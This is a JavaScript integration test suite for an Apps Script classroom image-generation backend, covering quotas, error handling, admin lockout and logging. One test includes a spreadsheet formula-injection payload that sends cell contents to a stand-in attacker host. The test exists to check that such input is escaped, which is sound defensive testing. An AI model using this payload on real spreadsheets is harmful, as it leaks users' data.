// tests/integration.test.js — 端對端整合測試（由 Claude 撰寫並擁有）
//
// ⚠️ 執行者（Antigravity）注意：
//   這個檔案是審查用的驗收關卡。不准修改、刪除或 skip 任何斷言。
//   若你認為某個斷言與 PLAN.md 的 API 合約衝突，寫進 說明/測試報告.md 的「待討論」，不要自己改。
//   你可以「新增」測試，但新增的測試請放在別的檔案。
//
// 做法：用假的 GAS 服務（PropertiesService、CacheService、LockService、UrlFetchApp、
// Utilities、ContentService、SpreadsheetApp、ScriptApp）把 gas/ 底下「所有」 .gs 檔
// 載入同一個 vm context（模擬 Apps Script 所有檔案共用全域範疇），
// 再直接呼叫 doGet / doPost，驗證整條流程。

const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const crypto = require('node:crypto');

const ROOT = path.resolve(__dirname, '..');
const GAS_ORDER = ['Logic.gs', 'Providers.gs', 'Store.gs', 'Admin.gs', 'Setup.gs', 'Code.gs'];
const fixture = (name) => fs.readFileSync(path.join(__dirname, 'fixtures', name), 'utf8');

const GEMINI_KEY = 'AIzaTESTKEY1234567890';
const ADMIN_PW = 'teacher-pass-123';
const DEV_A = 'devaaaaa-1111-2222-3333-444455556666';
const DEV_B = 'devbbbbb-1111-2222-3333-444455556666';

function taipeiKey(d) {
  const t = new Date(d.getTime() + 8 * 3600 * 1000);
  return '' + t.getUTCFullYear() + String(t.getUTCMonth() + 1).padStart(2, '0') + String(t.getUTCDate()).padStart(2, '0');
}

function makeEnv(initialProps = {}) {
  // ---- PropertiesService ----
  const props = new Map(Object.entries(Object.assign({
    PROVIDER: 'gemini',
    GEMINI_API_KEY: GEMINI_KEY,
    SERVICE_OPEN: 'true',
    COOLDOWN_SEC: '0',
    LOG_SHEET_ID: 'SHEET1'
  }, initialProps)));
  const scriptProps = {
    getProperty: (k) => (props.has(k) ? props.get(k) : null),
    setProperty: (k, v) => { props.set(k, String(v)); return scriptProps; },
    setProperties: (obj) => { for (const k of Object.keys(obj)) props.set(k, String(obj[k])); return scriptProps; },
    getProperties: () => Object.fromEntries(props),
    deleteProperty: (k) => { props.delete(k); return scriptProps; }
  };

  // ---- CacheService（強制真實限制：key ≤ 250 字元、value ≤ 100KB）----
  const cache = new Map();
  const scriptCache = {
    get: (k) => (cache.has(k) ? cache.get(k) : null),
    put: (k, v) => {
      if (String(k).length > 250) throw new Error('Argument too large: key');
      if (String(v).length > 100 * 1024) throw new Error('Argument too large: value');
      cache.set(k, String(v));
    },
    remove: (k) => { cache.delete(k); }
  };

  // ---- LockService ----
  const lock = {
    held: false,
    tryLock() { if (this.held) return false; this.held = true; return true; },
    waitLock() { if (this.held) throw new Error('Lock timeout'); this.held = true; },
    releaseLock() { this.held = false; },
    hasLock() { return this.held; }
  };

  // ---- UrlFetchApp ----
  const fetchCalls = [];
  let fetchHandler = () => ({ code: 200, text: fixture('gemini-success.json') });
  const UrlFetchApp = {
    fetch(url, opt) {
      fetchCalls.push({ url, opt, lockHeldDuringFetch: lock.held });
      const r = fetchHandler(url, opt);
      return { getContentText: () => r.text, getResponseCode: () => r.code };
    }
  };

  // ---- SpreadsheetApp ----
  const rows = [['時間', '裝置短碼', '模式', '風格', '學生描述', '結果代碼', '耗時(ms)', '供應商']];
  const sheet = {
    appendRow: (r) => { rows.push(r.slice()); return sheet; },
    getLastRow: () => rows.length,
    getLastColumn: () => Math.max(...rows.map((r) => r.length)),
    getRange: (row, col, numRows = 1, numCols = 1) => ({
      getValues: () => rows.slice(row - 1, row - 1 + numRows)
        .map((r) => Array.from({ length: numCols }, (_, i) => (r[col - 1 + i] === undefined ? '' : r[col - 1 + i])))
    }),
    setName: () => sheet,
    setFrozenRows: () => sheet
  };
  const ss = { getId: () => 'SHEET1', getSheetByName: () => sheet, getSheets: () => [sheet] };
  const SpreadsheetApp = {
    openById: (id) => { if (id !== 'SHEET1') throw new Error('Spreadsheet not found'); return ss; },
    create: () => ss
  };

  // ---- Utilities ----
  const Utilities = {
    DigestAlgorithm: { SHA_256: 'sha256' },
    Charset: { UTF_8: 'utf8' },
    computeDigest: (_alg, str) => Array.from(crypto.createHash('sha256').update(str, 'utf8').digest()).map((b) => (b > 127 ? b - 256 : b)),
    formatDate: (d, tz, fmt) => {
      if (tz !== 'Asia/Taipei' || fmt !== 'yyyyMMdd') throw new Error('fake formatDate only supports Asia/Taipei yyyyMMdd');
      return taipeiKey(d);
    },
    base64Decode: (b64) => Array.from(Buffer.from(b64, 'base64')),
    newBlob: (bytes, mime, name) => ({ __blob: true, bytes, mime, name }),
    getUuid: () => crypto.randomUUID()
  };

  const ContentService = {
    MimeType: { JSON: 'JSON' },
    createTextOutput: (s) => ({ content: s, setMimeType() { return this; }, getContent() { return this.content; } })
  };

  const ScriptApp = {
    getProjectTriggers: () => [],
    newTrigger: () => {
      const chain = { timeBased: () => chain, atHour: () => chain, everyDays: () => chain, inTimezone: () => chain, create: () => ({}) };
      return chain;
    }
  };

  const quietConsole = { log() {}, info() {}, warn() {}, error() {} };

  const ctx = vm.createContext({
    console: quietConsole,
    PropertiesService: { getScriptProperties: () => scriptProps },
    CacheService: { getScriptCache: () => scriptCache },
    LockService: { getScriptLock: () => lock },
    UrlFetchApp, SpreadsheetApp, Utilities, ContentService, ScriptApp
  });
  for (const f of GAS_ORDER) {
    vm.runInContext(fs.readFileSync(path.join(ROOT, 'gas', f), 'utf8'), ctx, { filename: f });
  }
  ctx.setAdminPassword(ADMIN_PW);

  const parse = (out) => {
    assert.ok(out && typeof out.getContent === 'function', '回應必須是 ContentService 的 TextOutput');
    return JSON.parse(out.getContent());
  };

  return {
    ctx, props, cache, lock, rows, fetchCalls,
    setFetch(fn) { fetchHandler = fn; },
    get: (params) => parse(ctx.doGet({ parameter: params })),
    post: (body) => parse(ctx.doPost({ postData: { contents: JSON.stringify(body) } })),
    today: () => taipeiKey(new Date()),
    count() { return parseInt(props.get('count_' + taipeiKey(new Date())) || '0', 10); },
    inFlight() { const v = cache.get('in_flight'); return v ? JSON.parse(v) : []; }
  };
}

const gen = (over = {}) => Object.assign({
  action: 'generate', deviceId: DEV_A, mode: 'text', style: 'pixar', prompt: '一隻戴帽子的貓在太空漫步'
}, over);

describe('整合測試：學生端', () => {
  test('status 回傳合法 JSON 與 7 種風格', () => {
    const env = makeEnv();
    const r = env.get({ action: 'status', deviceId: DEV_A });
    assert.strictEqual(r.ok, true, JSON.stringify(r));
    assert.strictEqual(r.data.open, true);
    assert.strictEqual(r.data.styles.length, 7);
  });

  test('status 收到超長 deviceId 時仍回傳合法 JSON（不可讓 GAS 噴 HTML 錯誤頁）', () => {
    const env = makeEnv();
    const r = env.get({ action: 'status', deviceId: 'x'.repeat(300) });
    assert.strictEqual(typeof r.ok, 'boolean');
  });

  test('generate 成功：回圖、扣 1 次、in-flight 歸零、呼叫 AI 時沒有持有鎖、寫入紀錄', () => {
    const env = makeEnv();
    const r = env.post(gen());
    assert.strictEqual(r.ok, true, JSON.stringify(r));
    assert.ok(r.data.image && r.data.image.length > 10);
    assert.strictEqual(env.count(), 1);
    assert.deepStrictEqual(env.inFlight(), []);
    assert.strictEqual(env.fetchCalls.length, 1);
    assert.strictEqual(env.fetchCalls[0].lockHeldDuringFetch, false, '呼叫 AI 期間不可持有鎖');
    assert.ok(!env.fetchCalls[0].url.includes(GEMINI_KEY), '金鑰不可出現在 URL');
    assert.strictEqual(env.lock.held, false, '請求結束後鎖必須已釋放');
    assert.ok(env.rows.some((row) => row.includes('SUCCESS')), '應寫入一筆 SUCCESS 紀錄');
  });

  test('班級通行碼：正確可生成；錯誤或沒帶都回 BAD_CODE 且不呼叫 AI', () => {
    const env = makeEnv({ CLASS_CODE: '4821' });
    assert.strictEqual(env.post(gen({ classCode: '4821' })).ok, true);
    assert.strictEqual(env.post(gen({ classCode: '0000' })).code, 'BAD_CODE');
    assert.strictEqual(env.post(gen()).code, 'BAD_CODE');
    assert.strictEqual(env.fetchCalls.length, 1);
  });

  test('服務關閉時回 CLOSED，不呼叫 AI', () => {
    const env = makeEnv({ SERVICE_OPEN: 'false' });
    assert.strictEqual(env.post(gen()).code, 'CLOSED');
    assert.strictEqual(env.fetchCalls.length, 0);
  });

  test('全班上限：第 2 張回 DAILY_LIMIT', () => {
    const env = makeEnv({ DAILY_LIMIT_GLOBAL: '1' });
    assert.strictEqual(env.post(gen()).ok, true);
    assert.strictEqual(env.post(gen({ deviceId: DEV_B })).code, 'DAILY_LIMIT');
  });

  test('供應商回錯誤：PROVIDER_ERROR、額度退還、in-flight 歸零、不洩漏原始錯誤、原始錯誤有寫進紀錄', () => {
    const env = makeEnv();
    env.setFetch(() => ({ code: 400, text: fixture('gemini-error.json') }));
    const r = env.post(gen());
    assert.strictEqual(r.code, 'PROVIDER_ERROR');
    assert.ok(!JSON.stringify(r).includes('API key not valid'), '不可把供應商原始錯誤回給前端');
    assert.strictEqual(env.count(), 0, '供應商錯誤要退還額度');
    assert.deepStrictEqual(env.inFlight(), []);
    assert.strictEqual(env.lock.held, false);
    const last = env.rows[env.rows.length - 1].map(String).join(' | ');
    assert.ok(last.includes('API key not valid'), 'PLAN 3-1：原始錯誤要寫進紀錄表，實際最後一列：' + last);
  });

  test('UrlFetchApp 拋例外（逾時）：PROVIDER_ERROR、額度退還、in-flight 歸零', () => {
    const env = makeEnv();
    env.setFetch(() => { throw new Error('Timeout: https://generativelanguage.googleapis.com'); });
    const r = env.post(gen());
    assert.strictEqual(r.code, 'PROVIDER_ERROR');
    assert.strictEqual(env.count(), 0);
    assert.deepStrictEqual(env.inFlight(), []);
    assert.strictEqual(env.lock.held, false);
  });

  test('安全阻擋：SAFETY_BLOCKED、不退還額度、in-flight 歸零', () => {
    const env = makeEnv();
    env.setFetch(() => ({ code: 200, text: fixture('gemini-safety-finish.json') }));
    assert.strictEqual(env.post(gen()).code, 'SAFETY_BLOCKED');
    assert.strictEqual(env.count(), 1);
    assert.deepStrictEqual(env.inFlight(), []);
  });

  test('被關鍵字擋下的請求也要寫進紀錄表（老師要看得到）', () => {
    const env = makeEnv();
    const r = env.post(gen({ prompt: 'a bloody monster' }));
    assert.strictEqual(r.code, 'BLOCKED_PROMPT');
    assert.ok(env.rows.some((row) => row.includes('BLOCKED_PROMPT')), '應寫入一筆 BLOCKED_PROMPT 紀錄');
    const stats = env.post({ action: 'admin.stats', adminPassword: ADMIN_PW });
    assert.strictEqual(stats.data.blocked, 1, '後台的被擋數要算到它');
  });

  test('欄位不合法被擋下時也要寫紀錄，且描述會截斷到 300 字', () => {
    const env = makeEnv();
    const r = env.post(gen({ prompt: '貓'.repeat(5000) }));
    assert.strictEqual(r.code, 'BAD_REQUEST');
    const last = env.rows[env.rows.length - 1];
    assert.ok(last.includes('BAD_REQUEST'));
    assert.ok(last.every((c) => String(c).length <= 300), '紀錄的每一格都不可超過 300 字');
  });

  test('紀錄表壞掉時，生圖仍然成功', () => {
    const env = makeEnv({ LOG_SHEET_ID: 'BROKEN' });
    assert.strictEqual(env.post(gen()).ok, true);
  });

  test('試算表公式注入：以 = + - @ 開頭的描述，寫進紀錄表時必須被跳脫', () => {
    const env = makeEnv();
    const evil = '=IMAGE("https://evil.example/?"&A1) 貓';
    env.post(gen({ prompt: evil }));
    const cell = env.rows[env.rows.length - 1].find((c) => typeof c === 'string' && c.includes('IMAGE('));
    assert.ok(cell, '描述應該有被寫進紀錄');
    assert.ok(!/^[=+\-@]/.test(cell), '寫入的儲存格不可以 = + - @ 開頭，實際：' + cell);
  });

  test('OpenAI 照片模式：打 edits 端點，image 欄位是 Blob', () => {
    const env = makeEnv({ PROVIDER: 'openai', OPENAI_API_KEY: 'sk-test-xyz' });
    env.setFetch(() => ({ code: 200, text: fixture('openai-success.json') }));
    const png1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
    const r = env.post(gen({ mode: 'photo', image: png1x1, imageMime: 'image/png' }));
    assert.strictEqual(r.ok, true, JSON.stringify(r));
    assert.ok(env.fetchCalls[0].url.endsWith('/images/edits'));
    assert.strictEqual(env.fetchCalls[0].opt.payload.image.__blob, true);
  });
});

describe('整合測試：老師端', () => {
  test('密碼錯 5 次鎖定，之後就算密碼正確也回 ADMIN_LOCKED', () => {
    const env = makeEnv();
    let r;
    for (let i = 0; i < 5; i++) r = env.post({ action: 'admin.login', adminPassword: 'wrong-' + i });
    assert.strictEqual(r.code, 'ADMIN_LOCKED');
    assert.strictEqual(env.post({ action: 'admin.login', adminPassword: ADMIN_PW }).code, 'ADMIN_LOCKED');
  });

  test('admin.login 成功，但回應中不含金鑰、密碼雜湊、salt', () => {
    const env = makeEnv();
    const r = env.post({ action: 'admin.login', adminPassword: ADMIN_PW });
    assert.strictEqual(r.ok, true, JSON.stringify(r));
    const s = JSON.stringify(r);
    assert.ok(!s.includes(GEMINI_KEY));
    assert.ok(!s.includes(env.props.get('ADMIN_PASSWORD_HASH')));
    assert.ok(!s.includes(env.props.get('ADMIN_PASSWORD_SALT')));
    assert.strictEqual(r.data.config.hasGeminiKey, true);
  });

  test('「開放到我關閉」（不帶 minutes）必須清掉先前已過期的 OPEN_UNTIL', () => {
    const env = makeEnv({ SERVICE_OPEN: 'true', OPEN_UNTIL: new Date(Date.now() - 60000).toISOString() });
    assert.strictEqual(env.post(gen()).code, 'CLOSED');
    assert.strictEqual(env.post({ action: 'admin.setOpen', adminPassword: ADMIN_PW, open: true }).ok, true);
    assert.strictEqual(env.post(gen()).ok, true);
  });

  test('admin.setOpen 關閉後，生圖回 CLOSED', () => {
    const env = makeEnv();
    env.post({ action: 'admin.setOpen', adminPassword: ADMIN_PW, open: false });
    assert.strictEqual(env.post(gen()).code, 'CLOSED');
  });

  test('從紀錄表看到的「裝置短碼」可以直接拿來封鎖該裝置', () => {
    const env = makeEnv();
    env.post(gen());
    const logs = env.post({ action: 'admin.logs', adminPassword: ADMIN_PW, limit: 10 });
    assert.strictEqual(logs.ok, true);
    const shortId = logs.data.logs[0].deviceIdShort;
    assert.ok(shortId && shortId.length <= 8, '紀錄只應顯示裝置短碼');
    assert.strictEqual(env.post({ action: 'admin.blockDevice', adminPassword: ADMIN_PW, deviceId: shortId }).ok, true);
    assert.strictEqual(env.post(gen()).code, 'DEVICE_BLOCKED');
    assert.strictEqual(env.post(gen({ deviceId: DEV_B })).ok, true, '其他裝置不受影響');
  });

  test('admin.setConfig 拒絕不合法的值，且不寫入', () => {
    const env = makeEnv({ DAILY_LIMIT_GLOBAL: '200' });
    const bad1 = env.post({ action: 'admin.setConfig', adminPassword: ADMIN_PW, dailyLimitGlobal: 'abc' });
    assert.strictEqual(bad1.code, 'BAD_REQUEST');
    const bad2 = env.post({ action: 'admin.setConfig', adminPassword: ADMIN_PW, provider: 'evil' });
    assert.strictEqual(bad2.code, 'BAD_REQUEST');
    const bad3 = env.post({ action: 'admin.setConfig', adminPassword: ADMIN_PW, dailyLimitGlobal: -5 });
    assert.strictEqual(bad3.code, 'BAD_REQUEST');
    assert.strictEqual(env.props.get('DAILY_LIMIT_GLOBAL'), '200');
    const good = env.post({ action: 'admin.setConfig', adminPassword: ADMIN_PW, dailyLimitGlobal: 50 });
    assert.strictEqual(good.ok, true, JSON.stringify(good));
    assert.strictEqual(env.ctx.Store.getConfig().dailyLimitGlobal, 50);
  });
});

describe('靜態檢查', () => {
  test('v1 不使用 Drive：gas/ 沒有 DriveApp，manifest 沒有 drive scope', () => {
    for (const f of GAS_ORDER) {
      const src = fs.readFileSync(path.join(ROOT, 'gas', f), 'utf8');
      assert.ok(!/DriveApp\./.test(src), f + ' 仍在使用 DriveApp');
    }
    const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, 'gas', 'appsscript.json'), 'utf8'));
    assert.ok(!manifest.oauthScopes.some((s) => s.includes('/auth/drive')), 'manifest 不應宣告 drive scope');
  });
});
